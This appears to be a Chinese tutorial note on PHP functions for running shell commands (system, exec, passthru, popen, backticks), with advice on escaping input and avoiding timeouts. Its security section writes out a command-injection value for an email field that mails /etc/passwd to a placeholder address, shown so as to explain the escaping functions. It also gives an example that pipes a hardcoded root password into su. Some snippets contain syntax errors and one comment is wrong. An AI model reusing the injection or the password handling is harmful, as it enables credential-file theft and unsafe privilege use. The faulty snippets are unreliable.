#PHP执行外部命令

##PHP提供的专门函数

1. system函数

		string system(string command [,int return_var] ),
		
		<?php  
		error_reporting(E_ALL);  //打印所有的环境变量
		$lastLineRes=system("dir");    
		echo "<br/>$lastLineRes<br/>"; 

2. exec函数

		string exec(string commad [,array res [, int return_var] ] )
		不输出并返回最后一行结果，array res 是存放所有执行结果的数组，return_var是状态码。
		
		print_r(exec("dir"));  
		print_r(exec("dir",$res));  
		print_r(exec("dir",$res2,$statu)); 

3. passthru函数

		void passthru(string commad [,int return_var] ),
		只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上,经常用来调用像pbmplus （Unix下的一个处理图片的工具，输出二进制的原始图片的流）这样的程序。

		passthru('1.gif);//会调用图形查看器显示图片
		passthru('E:\notes\sn\bibao.md');//会调用markdown来打开此文件

###使用函数popen()打开进程

上面的方法只能简单地执行命令，却不能与命令交互。但有些时候必须向命令输入一些东西，如在增加Linux的系统用户时，要调用su来把当前用户换到root才行，而su命令必须要在命令行上输入root的密码。这种情况下，用上面提到的方法显然是不行的。 

popen ()函数打开一个进程管道来执行给定的命令，返回一个文件句柄。既然返回的是一个文件句柄，那么就可以对它读和写了。

在PHP3中，对这种句柄只能做单一的操作模式，要么写，要么读；从PHP4开始，可以同时读和写了。除非这个句柄是以一种模式（读或写）打开的，否则必须调用pclose()函数来关闭 它。

		/* PHP中如何增加一个系统用户  
		下面是一段例程，增加一个名字为james的用户,  
		root密码是 verygood。仅供参考  
		*/   
		$sucommand = "su --login root --command";   
		$useradd = "useradd ";   
		$rootpasswd = "verygood";   
		$user = "james";   
		$user_add = sprintf("%s "%s %s"",$sucommand,$useradd,$user);   
		$fp = @popen($user_add,"w");   
		@fputs($fp,$rootpasswd);   
		@pclose($fp);   

##使用反撇号`
这个方法以前没有归入PHP的文档，是作为一个秘技存在的。方法很简单，用两个反撇号把要执行的命令括起来作为一个表达式，这个表达式的值就是命令执行的结果。如： 

		$res='ls -l';   
		echo "`$res`";  

##要考虑两个问题：安全性和超时。 
      
a.先看安全性。

比如，你有一家小型的网上商店，所以可以出售的产品列表放在一个文件中。你编写了一个有表单的HTML文件，让你的用户输入他们的EMAIL地 址，然后把这个产品列表发给他们。假设你没有使用PHP的mail()函数（或者从未听说过），你就调用Linux/Unix系统的mail程序来发送这 个文件。程序就象这样： 

	system("mail $to < products.txt");   

如果有个恶意的用户输入了这样一个EMAIL地址：`'--bla ; mail someone@domain.com < /etc/passwd ;' `，那么这条命令最终变成：`'mail --bla ; mail someone@domain.com < /etc/passwd ; < products.txt' `

PHP为我们提供了两个函数：`EscapeShellCmd()`和`EscapeShellArg()`。函数EscapeShellCmd把一个字符串 中所有可能瞒过Shell而去执行另外一个命令的字符转义。这些字符在Shell中是有特殊含义的，象分号（），重定向（>）和从文件读入 （<）等。函数EscapeShellArg是用来处理命令的参数的。它在给定的字符串两边加上单引号，并把字符串中的单引号转义，这样这个字符串 就可以安全地作为命令的参数

b.超时问题。

如果要执行的命令要花费很长的时间，那么应该把这个命令放到系统的后台去运 行。但在默认情况下，像system()等函数要等到这个命令运行完才返回（实际上是要等命令的输出结果），这肯定会引起PHP脚本的超时。解决的办法是把命令的输出重定向到另外一个文件或流中，如：

	system("/usr/local/bin/order_proc > /tmp/null &");   